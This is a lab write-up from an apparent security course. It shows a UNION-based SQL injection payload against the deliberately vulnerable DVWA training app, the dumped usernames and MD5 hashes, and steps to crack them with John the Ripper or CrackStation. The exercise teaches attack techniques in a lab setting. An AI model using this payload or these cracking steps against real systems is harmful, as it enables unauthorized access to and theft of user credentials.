# PROGRAM 6

## Password Cracking and Credential Harvesting

### Use the Obtained Hashed Password to Decrypt It Using John the Ripper or Hashcat Tool

### Solution

## Step 1: Open DVWA Web Page

- Select DVWA Security to:

```text
LOW
```

- Go to SQL Injection and type the following command:

```sql
'UNION select user,password from users#
```

### Output

```text
ID: 'UNION select user,password from users#
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

```text
ID: 'UNION select user,password from users#
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03
```

```text
ID: 'UNION select user,password from users#
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
```

```text
ID: 'UNION select user,password from users#
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
```

```text
ID: 'UNION select user,password from users#
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

## Step 2

Open a nano file and copy and paste the hash password.
```bash
nano <filename.txt>
```

## Step 3

Once the file is saved, type:

```bash
john <filename.txt>
```
```bash
john --format = raw-MD5 <filename.txt>
```
## Alternative Method

Open any decryption tool such as CrackStation in firefox and paste the hash password.

## Result

Successfully obtained password hashes and attempted password recovery using John the Ripper or an online hash lookup tool.
